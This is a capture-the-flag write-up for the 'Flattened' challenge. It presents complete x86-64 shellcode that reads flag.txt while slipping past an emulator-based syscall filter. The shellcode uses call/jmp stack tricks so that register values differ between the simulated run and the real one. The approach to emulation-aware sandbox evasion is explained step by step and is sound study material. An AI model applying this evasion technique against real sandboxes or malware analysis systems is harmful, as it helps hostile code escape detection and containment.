
# Flattened

## Preface
It turns out there is a much [simpler solution](https://ctftime.org/writeup/31124) to the challenge, that relies on self-modifying shellcode (I could have sworn I tried this).
This writeup explains a more complicated solution, taking a different approach.
It has the advantage of not requiring memory that is both writeable and executable.

## Overview

### Challenge Overview

The challenge features a program that receives shellcode as input, which it then executes.
The catch is that the program first removes all branching instructions from the shellcode before executing it and aborts on illegal system calls (syscalls).
We need to supply it with shellcode that passes (or bypasses) this filter in order to retrieve the flag.


### Approach Overview
Our approach works by creating shellcode that passes the filter, but when the branching instructions are removed, the semantics change in order to retrieve the flag.

## Challenge
After receiving the shellcode, the challenge first simulates it with [qilling](https://github.com/qilingframework/qiling) (we refer to this as the _simulation phase_).
All instructions that are executed during the simulation phase are inserted into a buffer, with the exception of branching instructions (`jmp`, `call`, `ret`, etc.)
We refer to the shellcode in this buffer, as the _flattened_ shellcode.
If an _illegal syscall_ is encountered during simulation, that is, a syscall for which register `rax` is neither 1 (`write`) nor 60 (`exit`), the simulation phase aborts and the challenge ends.
Otherwise, the instructions are executed on the host, which we refer to as the _execution phase_.

## Approach

We start with the stock shellcode for retrieving the flag from a file named "flag.txt".
The following shellcode opens the file named "flag.txt", reads its content to a buffer, prints this buffer to `STDOUT` and exists.
These steps are achieved by using the syscalls `open`, `read`, `write` and `exit`, respectively.
```asm
global    _start
section   .text

_start:
; --- open file "flag.txt" ---
mov rax, 2 ; code for syscall "open"
xor rsi, rsi ; "flags" argument is "read-only"
push word 0x7478 ; write file name "flag.txt" to stack
push word 0x742e 
push word 0x6761
push word 0x6c66 
lea rdi, [rsp] ; ptr argument to file name
mov [rdi+8], rsi ; null byte at end of file name
xor rdx, rdx ; file mode (only applicable when creating a new file (I think))
syscall ; open file

; --- read file ---
mov rdi, rax ; move file descriptor, returned from "open" syscall, to "fd" argument for "read"
mov rsi, rsp ; use stack for read buffer
xor rdx, rdx 
mov dl, 128 ; read length
mov rax, 0 ; code for syscall "read"
syscall ; read flag

; --- write the flag ---
mov rdx, rax ; move num chars, returned from "read" syscall to "count" argument for "write"
xor rdi, rdi 
mov dil, 1 ; STDOUT fd
xor rax, rax 
mov al, 1 ; code for syscall "write"
syscall ; write flag

; --- exit ---
mov rdi, 1 ; exit code
mov rax, 60 ; code for syscall "exit"
syscall ; exit
```
This shellcode will not pass the filters, because it contains two illegal syscalls:
`rax=2` (`open`) and `rax=0` (`read`)

We need to change the shellcode so that it passes the filters during simulation, but still retrieves the flag during execution.
We achieve this by exploiting the fact that branching instructions are removed during the simulation phase.
In other words, during the simulation phase, only legal syscalls will be encountered (three writes and an exit).
Then, by flattening the shellcode, the semantics change so that the flag is retrieved instead.

We achieve this in the following way.
The `call` instruction pushes the address of the next instruction to the stack.
This is necessary for function calls, so that control-flow can continue from where the function was called, after its completion.
This instruction is removed by the challenge and will therefore not exists in the flattened shellcode.
Therefore, during simulation we have a different value at the top of stack than during execution.
To assign a specific value to a register, depending on whether we are in simulation or execution phase, we use the following pattern.
Say we want to assign the value `x` to the register `rax` during simulation and `y` during execution.
```asm
push y ; value for execution
push rsp
call _call1
dd x ; value for simulation
_ret1:
mov rax, [rsp]
mov rax, [rax]
...
_call1:
jmp _ret1
```
During simulation, the `call` instruction pushes the address of the `x` "instruction" to the stack (its fine if this is an illegal instruction, since it will not be executed in either simulation or execution).
Then, it branches to `_call1`, but just to jump back immediately.
At this point we have:  
`rsp --> < x insn addr> --> < x >`
Therefore, the instructions below will load `x` into `rax`.
```asm
mov rax, [rsp]
mov rax, [rax]
```

On the other hand, during execution, the flattened shellcode will be executed (note, `dd x` is not included, since it was not executed during simulation):
```asm
push y ; value for execution
push rsp
mov rax, [rsp]
mov rax, [rax]
...
```
Therefore, we have:  
`rsp --> < some addr > --> y`
In this case, the instructions below will load `y` into `rax`.
```asm
mov rax, [rsp]
mov rax, [rax]
```
Therefore, we have successfully loaded a different value into a register depending on whether we are in simulation phase or execution phase.


We will mainly use this technique to set `rax=1` during simulation and `rax=2` / `rax=0` during execution.
However, we also need this technique to ensure we pass sensible arguments to the different syscalls, in both simulation and execution.

The final shellcode follows.

```asm
global    _start
section   .text

_start:
; --- open file "flag.txt" ---
push 2 ; code for syscall "open" (execution)
push rsp 
call _call1
dd 1 ; code for syscall "write" (simulation)
_ret1:
mov rax, [rsp]
mov eax, [rax]
xor rsi, rsi ; "flags" argument "read-only" (execution) / It seems a buffer of NULL for write is acceptable (simulation)
push word 0x7478 ; write file name "flag.txt" to stack
push word 0x742e
push word 0x6761
push word 0x6c66
lea rdi, [rsp] ; ptr argument to file name
mov [rdi+8], rsi ; null byte at end of file name
push rdi ; pointer to filename for "open" (execution)
push rsp 
call _call2
db 01 ; STDOUT for "write" (simulation)
times 7 db 00
_ret2:
mov rdi, [rsp]
mov rdi, [rdi] 
xor rdx, rdx ; open "mode" (execution) / write "count" (simulation) (0, so nothing will be written)
syscall ; open file (execution) / write "" (simulation)


; --- read file ---
mov rdi, rax ; move file descriptor, returned from "open" syscall, to "fd" argument for "read" (execution) / move num bytes written (0) to rdi (simulation) 
mov rsi, rsp ; use stack for buffer
xor rdx, rdx 
push 0 ; code for syscall "read" (execution)
push rsp 
call _call3
db 01 ; code for syscall "write" (simulation)
times 7 db 00
_ret3:
mov rax, [rsp]
mov rax, [rax]
push 128 ; size for "read" (execution)
push rsp 
call _call4
times 8 db 0 ; size for "write" (simulation)
_ret4:
mov rdx, [rsp]
mov rdx, [rdx]
push rdi ; file descriptor for "read" from "open" (execution)
push rsp
call _call5
db 01 ; STDOUT file descriptor for "write" (simulation)
times 7 db 00
_ret5:
mov rdi, [rsp]
mov rdi, [rdi]
syscall ; read file (execution) / write "" (simulation)


; Since the "write" and "exit" syscalls are legal, we can use the stock shellcode from here.
; --- write the flag ---
mov rdx, rax ; move num chars, returned from "read" syscall to "count" argument for "write"
xor rdi, rdi
mov dil, 1 ; STDOUT fd
xor rax, rax
mov al, 1 ; code for syscall "write"
syscall ; write flag

; --- exit ---
mov rdi, 1 ; exit code
mov rax, 60 ; code for syscall "exit"
syscall ; exit

_call1:
jmp _ret1
_call2:
jmp _ret2
_call3:
jmp _ret3
_call4:
jmp _ret4
_call5:
jmp _ret5
```
